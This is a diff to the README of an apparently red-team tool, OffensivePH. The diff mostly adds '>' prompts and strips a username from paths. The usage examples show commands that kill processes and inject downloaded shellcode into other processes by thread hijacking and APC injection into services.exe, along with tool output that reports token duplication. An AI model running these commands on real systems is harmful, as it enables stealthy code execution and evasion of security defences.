@@ -14,7 +14,7 @@ offensivph.exe [-kill|-peb|-hijack|-apcinject] [<PID>] [<URL>]
 ```
 - Kill processes
 ```
-offensiveph.exe -kill 8228
+> offensiveph.exe -kill 8228
 # OffensivePH
 -------------------------------------------------
 [*] Driver path: C:\Users\RedSection\kph.sys
@@ -25,10 +25,10 @@ offensiveph.exe -kill 8228
 ```
 - Inject shellcode by using Hijack Thread execution 
 ```
-offensiveph.exe -hijack 8412 http://192.168.56.100/calc-clean.bin
+> offensiveph.exe -hijack 8412 http://192.168.56.100/calc-clean.bin
 # OffensivePH
 -------------------------------------------------
-[*] Driver path: C:\Users\baris\RedSection\kph.sys
+[*] Driver path: C:\Users\RedSection\kph.sys
 [*] Connected to KprocessHacker Driver
 [+] Connecting to URL for downloading payload
 [+] Process 8412 thread is hijacked to execute payload
@@ -36,10 +36,10 @@ offensiveph.exe -hijack 8412 http://192.168.56.100/calc-clean.bin
 ```
 - Inject shellcode into a new services.exe instance
 ```
-offensiveph.exe -apcinject http://192.168.56.100/calc-clean.bin
+> offensiveph.exe -apcinject http://192.168.56.100/calc-clean.bin
 # OffensivePH
 -------------------------------------------------
-[*] Driver path: C:\Users\baris\RedSection\kph.sys
+[*] Driver path: C:\Users\RedSection\kph.sys
 [*] Connected to KprocessHacker Driver
 [+] Process 652 token is duplicated as Impersonation Token!
 [+] Connecting to URL for downloading payload
